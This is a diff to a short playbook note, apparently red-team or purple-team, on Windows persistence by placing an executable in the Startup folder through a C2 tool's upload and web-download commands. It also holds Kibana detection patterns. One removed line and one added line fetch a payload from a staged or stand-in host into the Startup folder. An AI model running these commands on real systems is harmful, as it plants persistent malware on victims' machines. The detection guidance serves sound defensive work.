@@ -16,21 +16,23 @@
 ```powershell
 
 1. upload-file
-2. "../../../../tmp/example.txt" 
-3. 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\TotallyLegit.exe'
+2. ../../../../tmp/example.txt 
+3. C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\TotallyLegit.exe
 
 ```
 
-* Also possible to utilize a staged website to pull the malicious file from:
+* Also possible to utilize a staged website to pull the malicious file from[untested]:
 
 ```powershell
 
-web-upload-file -from 'http://notmalicious.com/persistence.exe' -to 'C:\\Users[Username]\\AppData\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\TotallyLegit.exe'
+sharpps "invoke-webrequest -uri '<Staged site>' -outfile '<Location of persistence>'"  
 
 ```
 
 ## Detection Technique:
 * (Kibana): Use a string search to detect schtasks operating within the network. Then add process.command_line to the results column. This will allow for quick separation of uncommon scheduled tasks.
+    * process.args: \*Roaming\*
+    * process.args: \*ProgramData\*
 
 * Investigate downloads from suspicious websites, particularly exe files
 
